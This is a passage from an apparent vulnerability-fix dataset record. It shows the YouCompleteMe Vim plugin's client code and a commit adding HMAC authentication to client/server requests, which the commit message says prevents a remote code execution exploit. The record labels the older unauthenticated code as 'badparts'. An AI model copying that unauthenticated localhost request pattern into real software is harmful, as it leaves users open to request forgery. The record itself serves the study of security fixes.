pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http://localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"}, "/python/ycm/youcompleteme.py": {"changes": [{"diff": "\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n", "add": 5, "remove": 3, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    self._temp_options_filename = None", "      self._temp_options_filename = options_file.name", "      json.dump( dict( self._user_options ), options_file )"], "goodparts": ["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )", "      options_dict = dict( self._user_options )", "      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )", "      json.dump( options_dict, options_file )"]}, {"diff": "\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "add": 0, "remove": 1, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    utils.RemoveIfExists( self._temp_options_filename )"], "goodparts": []}], "source": "\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http://localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https://github.com/Valloric/YouCompleteMe/issues/641\n#  https://github.com/kennethreitz/requests/issues/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http://localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}}, "msg": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}}, "https://github.com/tibi77/vim": {"e965e0284789e610c0a50d20a92a82ec5c135064": {"url": "https://api.github.com/repos/tibi77/vim/commits/e965e0284789e610c0a50d20a92a82ec5c135064", "html_url": "https://github.com/tibi77/vim/commit/e965e0284789e610c0a50d20a92a82ec5c135064", "message": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.", "sha": "e965e0284789e610c0a50d20a92a82ec5c135064", "keyword": "remote code execution prevent", "diff": "diff --git a/python/ycm/client/base_request.py b/python/ycm/client/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a/python/ycm/client/base_request.py\n+++ b/python/ycm/client/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http://localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER 